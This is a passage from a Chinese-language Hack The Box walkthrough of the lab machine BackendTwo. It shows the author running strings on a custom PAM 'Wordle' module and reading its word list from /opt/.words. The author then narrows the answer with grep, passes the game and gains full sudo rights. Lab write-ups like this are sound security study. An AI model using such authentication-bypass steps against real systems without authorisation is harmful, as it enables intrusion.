common-session-noninteractive<br>htb@BackendTwo:/etc/pam.d$ <br></code></pre></td></tr></table></figure>

<p>pam_wordle.so看起来像是游戏的答案校验，</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs bash">htb@BackendTwo:~$ find / -name pam_wordle.so 2&gt;/dev/null<br>/usr/lib/x86_64-linux-gnu/security/pam_wordle.so<br>htb@BackendTwo:~$ strings /usr/lib/x86_64-linux-gnu/security/pam_wordle.so<br>Q`^B<br>DICT<br>fetch_word<br>regcomp<br>fopen<br>strlen<br>regexec<br>fgets<br>fclose<br>check_word<br>strncmp<br>wordle_guess<br>pam_prompt<br>pam_sm_authenticate<br>time<br>srand<br>pam_sm_setcred<br>pam_sm_acct_mgmt<br>AWAVAUATSH<br>[A\A]A^A_]<br>linu<br>^[abcdefghijklmnopqrstuvwxyz]&#123;5&#125;$<br>Word: <br>Invalid guess: unknown word.<br>Warning: error reading dictionary.<br>Invalid guess: guess length != word length.<br>Correct!<br>Hint-&gt;%s<br>--- Welcome to PAM-Wordle! ---<br>A five character [a-z] word has been selected.<br>You have %d attempts to guess the word.<br>After each guess you will recieve a hint <span class="hljs-built_in">which</span> indicates:<br>? - what letters are wrong.<br>* - what letters are <span class="hljs-keyword">in</span> the wrong spot.<br>[a-z] - what letters are correct.<br>--- Attempt %d of %d ---<br>You lose.<br>The word was: %s<br>;*3$<span class="hljs-string">&quot;</span><br><span class="hljs-string">/opt/.words</span><br><span class="hljs-string">GCC: (Debian 10.2.1-6) 10.2.1 20210110</span><br><span class="hljs-string">_DYNAMIC</span><br><span class="hljs-string">_GLOBAL_OFFSET_TABLE_</span><br><span class="hljs-string">fgets</span><br><span class="hljs-string">fetch_word</span><br><span class="hljs-string">strncmp</span><br><span class="hljs-string">check_word</span><br><span class="hljs-string">regcomp</span><br><span class="hljs-string">fopen</span><br><span class="hljs-string">srand</span><br><span class="hljs-string">fclose</span><br><span class="hljs-string">regexec</span><br><span class="hljs-string">time</span><br><span class="hljs-string">wordle_guess</span><br><span class="hljs-string">DICT</span><br><span class="hljs-string">pam_sm_setcred</span><br><span class="hljs-string">strlen</span><br><span class="hljs-string">pam_sm_authenticate</span><br><span class="hljs-string">pam_sm_acct_mgmt</span><br><span class="hljs-string">pam_prompt</span><br><span class="hljs-string">.symtab</span><br><span class="hljs-string">.strtab</span><br><span class="hljs-string">.shstrtab</span><br><span class="hljs-string">.gnu.hash</span><br><span class="hljs-string">.dynsym</span><br><span class="hljs-string">.dynstr</span><br><span class="hljs-string">.rela.dyn</span><br><span class="hljs-string">.rela.plt</span><br><span class="hljs-string">.text</span><br><span class="hljs-string">.rodata</span><br><span class="hljs-string">.eh_frame</span><br><span class="hljs-string">.dynamic</span><br><span class="hljs-string">.got</span><br><span class="hljs-string">.got.plt</span><br><span class="hljs-string">.data</span><br><span class="hljs-string">.comment</span><br><span class="hljs-string">htb@BackendTwo:~$ </span><br></code></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs bash">htb@BackendTwo:/opt$ <span class="hljs-built_in">cat</span> .words <br>write<br>close<br>fstat<br>lstat<br>lseek<br>ioctl<br>readv<br>msync<br>shmat<br>pause<br>alarm<br><span class="hljs-built_in">clone</span><br>vfork<br>wait4<br><span class="hljs-built_in">uname</span><br>semop<br>shmdt<br>fcntl<br>flock<br>fsync<br><span class="hljs-built_in">chdir</span><br><span class="hljs-built_in">mkdir</span><br><span class="hljs-built_in">rmdir</span><br>creat<br><span class="hljs-built_in">chmod</span><br><span class="hljs-built_in">chown</span><br><span class="hljs-built_in">umask</span><br><span class="hljs-built_in">times</span><br>utime<br><span class="hljs-built_in">mknod</span><br>ustat<br>sysfs<br>mlock<br>prctl<br>mount<br>tkill<br>futex<br>mbind<br>ppoll<br>pipe2<br>setns<br>rocku<br>odays<br>mysql<br>hacks<br>cheat<br>crypt<br>virus<br>hydra<br>creds<br>cmake<br>ipsec<br>javac<br>leaks<br>locks<br>linux<br>login<br>nginx<br>ngrok<br>nikto<br>patch<br>pgsql<br>posix<br>proxy<br>putty<br>quake<br>samba<br>wfuzz<br>wheel<br>opsec<br>shell<br>worms<br>union<br>blind<br>htb@BackendTwo:/opt$ <br></code></pre></td></tr></table></figure>

<p>很好，现在我好像只用猜这些单词的顺序就可以了：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">--- Attempt 1 of 6 ---<br>Word: write<br>Hint-&gt;?????<br>--- Attempt 2 of 6 ---<br>Word: close<br>Hint-&gt;*lo??<br>--- Attempt 3 of 6 ---<br>Word: <br><br></code></pre></td></tr></table></figure>

<p>lo是正确的，*表示c在错误的位置上，那么可以筛选一下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">htb@BackendTwo:/opt$ <span class="hljs-built_in">cat</span> .words |grep l |grep o|grep c| grep -vE <span class="hljs-string">&#x27;(t|e)&#x27;</span><br>flock<br>mlock<br>locks<br>htb@BackendTwo:/opt$ <br></code></pre></td></tr></table></figure>

<p>筛选有l和o还要c但不包含T或e的单词。正确答案是：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs bash">htb@BackendTwo:~$ sudo -l<br>[sudo] password <span class="hljs-keyword">for</span> htb: <br>--- Welcome to PAM-Wordle! ---<br><br>A five character [a-z] word has been selected.<br>You have 6 attempts to guess the word.<br><br>After each guess you will recieve a hint <span class="hljs-built_in">which</span> indicates:<br>? - what letters are wrong.<br>* - what letters are <span class="hljs-keyword">in</span> the wrong spot.<br>[a-z] - what letters are correct.<br><br>--- Attempt 1 of 6 ---<br>Word: write<br>Hint-&gt;?????<br>--- Attempt 2 of 6 ---<br>Word: close<br>Hint-&gt;*lo??<br>--- Attempt 3 of 6 ---<br>Word: flock<br>Hint-&gt;?lock<br>--- Attempt 4 of 6 ---<br>Word: mlock<br>Correct!<br>Matching Defaults entries <span class="hljs-keyword">for</span> htb on backendtwo:<br>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin<br><br>User htb may run the following commands on backendtwo:<br>    (ALL : ALL) ALL<br>htb@BackendTwo:~$ <br></code></pre></td></tr></table></figure>

<p>可以sudo所有.</p>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/Hack-The-Box/" class="category-chain-item">Hack The Box</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/Linux/" class="print-no-link">#Linux</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>HTB Walkthrough - BackendTwo</div>
      <div>https://crazyinside.github.io/post/HackTheBox-BackendTwo.html</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>Author</div>
          <div>CrazyInSide</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>Posted on</div>
          <div>August 14, 2023</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>Licensed under</div>
          <div>
            
              
              
                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
                    <i class="iconfont icon-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/post/HackTheBox-Bart.html" title="HTB Walkthrough - Bart">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">HTB Walkthrough - Bart</span>
                        <span class="visible-mobile">Previous</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/post/HackTheBox-Backend.html" title="HTB Walkthrough - Backend">
                        <span class="hidden-mobile">HTB Walkthrough - Backend</span>
                        <span class="visible-mobile">Next</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>Table of Contents</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  
  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script  src="/js/local-search.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
  </noscript>
</body>
</html>
